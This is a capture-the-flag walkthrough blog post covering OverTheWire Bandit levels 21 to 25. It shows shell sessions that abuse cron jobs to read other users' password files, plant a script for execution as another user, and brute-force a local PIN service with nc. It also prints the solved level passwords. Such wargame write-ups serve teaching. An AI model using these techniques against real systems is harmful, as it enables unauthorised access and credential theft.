<div dir="ltr" style="text-align: left;" trbidi="on"><h2 style="text-align: left;">Bandit 21</h2><div style="text-align: left;"><i> </i>Very easy level, you'll need to read about cron, but for now first paragraph of this <a href="https://help.ubuntu.com/community/CronHowto">link </a>will do:</div><div style="text-align: left;"><br /></div><div class="line874"><span style="font-family: &quot;georgia&quot; , &quot;times new roman&quot; , serif;">"Cron is a system daemon used to execute desired tasks (in the background) at designated times.  <span class="anchor" id="line-6"></span><span class="anchor" id="line-7"></span></span></div><span style="font-family: &quot;georgia&quot; , &quot;times new roman&quot; , serif;">A  crontab file is a simple text file containing a list of commands meant  to be run at specified times. It is edited using the crontab command.  The commands in the crontab file (and their run times) are checked by  the cron daemon, which executes them in the system background."</span><br /><br /><span style="font-family: &quot;georgia&quot; , &quot;times new roman&quot; , serif;"><span style="font-family: inherit;">First, let's see which cron job is being executed for bandit 2<span style="font-family: inherit;">2:</span></span></span><br /><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit21@melinda:~$ <b>cd /etc/cron.d</b>&nbsp;</code></pre><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;">&nbsp;bandit21@melinda:/etc/cron.d$ <b>ls</b>  <br /> behemoth4_cleanup cronjob_bandit23    leviathan5_cleanup  natas-session-toucher natas25_cleanup~ php5    semtex0-ppc vortex0  <br /> cron-apt      cronjob_bandit24    manpage3_resetpw_job natas-stats      natas26_cleanup  semtex0-32 semtex5   vortex20  <br /> <b>cronjob_bandit22</b>  cronjob_bandit24_root melinda-stats     natas25_cleanup    natas27_cleanup  semtex0-64 sysstat&nbsp;</code></pre><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit21@melinda:/etc/cron.d$ <b>cat cronjob_bandit2</b>  <br /> cat: cronjob_bandit2: No such file or directory&nbsp;</code></pre><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;">&nbsp;bandit21@melinda:/etc/cron.d$ cat cronjob_bandit22  <br /> * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null  <br /></code></pre><br />What does <b>/usr/bin/cronjob_bandit22.sh</b> do?<br /><br /><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit21@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh  <br /> #!/bin/bash  <br /> chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv  <br /> cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv  <br /></code></pre><br />First line after the sha-bang gives the temp file the following permissions: user can write, anyone can read. So we're able to read the content of that file.<br />Second line copies the content of /etc/bandit_pass/bandit22 (containing our password) to the temporary file. Check it's content and you'll find the password to the next level!<br /><br />Password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI<br /><br /><h2 style="text-align: left;">Bandit 22</h2><div style="text-align: left;">Same steps as earlier, let's see what the script /usr/bin/cronjob_bandit23.sh does:</div><div style="text-align: left;"><br /></div><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit22@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh  <br /> #!/bin/bash  <br /> myname=$(whoami)  <br /> mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)  <br /> echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"  <br /> cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget  <br /></code></pre><div style="text-align: left;"><br /></div><div style="text-align: left;">So we need to get the MD5 encoding of $target (which is "I am user bandit23"), then read the content of /tmp/MD5output:</div><div style="text-align: left;"><br /></div><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit22@melinda:/etc/cron.d$ md5sum &lt;&lt;&lt; $(echo I am user bandit23)  <br /> 8ca319486bfbbc3663ea0fbe81326349 -  <br /> bandit22@melinda:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349  <br /> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n  <br /> bandit22@melinda:/etc/cron.d$  <br /></code></pre><div style="text-align: left;"><h2 style="text-align: left;">Bandit 23</h2><div style="text-align: left;">More of the same, let's see what the script does:</div><div style="text-align: left;"><br /></div><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh  <br /> #!/bin/bash  <br /> myname=$(whoami)  <br /> cd /var/spool/$myname  <br /> echo "Executing and deleting all scripts in /var/spool/$myname:"  <br /> for i in * .*;  <br /> do  <br />   if [ "$i" != "." -a "$i" != ".." ];  <br />   then  <br />     echo "Handling $i"  <br />     timeout -s 9 60 "./$i"  <br />     rm -f "./$i"  <br />   fi  <br /> done  <br /> bandit23@melinda:/etc/cron.d$  <br /></code></pre><div style="text-align: left;">So it navigates to /var/spool/bandit24 directory and executes all scripts as bandit24. Alright, so we need to make it write the content of /etc/bandit_pass/bandit24 somewhere, maybe a temporary file? <b>Make sure you give the script and the folder the correct permissions.</b></div><div style="text-align: left;"></div><div style="text-align: left;"></div><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit23@melinda:/etc/cron.d$ mkdir /tmp/somefunnyname  <br /> bandit23@melinda:/etc/cron.d$ chmod 777 /tmp/somefunnyname  <br /> bandit23@melinda:/etc/cron.d$ cd /tmp/somefunnyname  <br /> bandit23@melinda:/tmp/somefunnyname$ cat &gt; torun.sh  <br /> #!/bin/bash  <br /> cat /etc/bandit_pass/bandit24 &gt; /tmp/somefunnyname/password  <br /> ^C  <br /> bandit23@melinda:/tmp/somefunnyname$ chmod 777 torun.sh  <br /> bandit23@melinda:/tmp/somefunnyname$ cp torun.sh /var/spool/bandit24/  <br /> bandit23@melinda:/tmp/somefunnyname$ ls -al /var/spool/bandit24/  <br /> total 153  <br /> drwxrwxrwx 2 bandit24 bandit23 151552 Oct 21 23:08 .  <br /> drwxr-xr-x 6 root   root    4096 May 3 2015 ..  <br /> bandit23@melinda:/tmp/somefunnyname$ ls  <br /> password torun.sh  <br /> bandit23@melinda:/tmp/somefunnyname$ cat password  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ  <br /> bandit23@melinda:/tmp/somefunnyname$  <br /></code></pre><div style="text-align: left;">Script got deleted, which means cron executed it and we got our password!<br /><br /><h2 style="text-align: left;">Bandit 24</h2><div style="text-align: left;">Our first bash for loop! You may want to read more about it <a href="http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-7.html">here</a>.<br /><br />First let's see how the daemon behaves. You'll realize it allows multiple input, we can create a list with format "&lt;password&gt; &lt;pin&gt;" for 0000-9999 and feed it to NC. Let's create a temp directory and navigate to it:</div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div><pre style="background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &quot;arial&quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;"><code style="color: black; word-wrap: normal;"> bandit24@melinda:/tmp/abatchy24$ <b>for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i &gt;&gt;list.txt; done  </b><br /> bandit24@melinda:/tmp/abatchy24$ <b>head list.txt</b>  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 3  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 4  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 6  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 7  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 8  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9  <br /> bandit24@melinda:/tmp/abatchy24$ <b>tail list.txt</b>  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9990  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9991  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9992  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9993  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9994  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9995  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9996  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9997  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9998  <br /> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999  <br /> bandit24@melinda:/tmp/abatchy24$ <b>nc -nv 127.0.0.1 30002 &lt; list.txt | grep -v Wrong</b>  <br /> Connection to 127.0.0.1 30002 port [tcp/*] succeeded!  <br /> I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.  <br /> Correct!  <br /> The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG  <br /> Exiting.  <br /> bandit24@melinda:/tmp/abatchy24$  <br /></code></pre><div style="text-align: left;">Done.<br /><h2 style="text-align: left;">Bandit 25&nbsp;</h2><div style="text-align: left;">Just another SSH key, but you may want to look into /etc/passwd file...</div><div style="text-align: left;"><br /></div><h2 style="text-align: left;">Bandit 26 (?)</h2></div></div></div></div>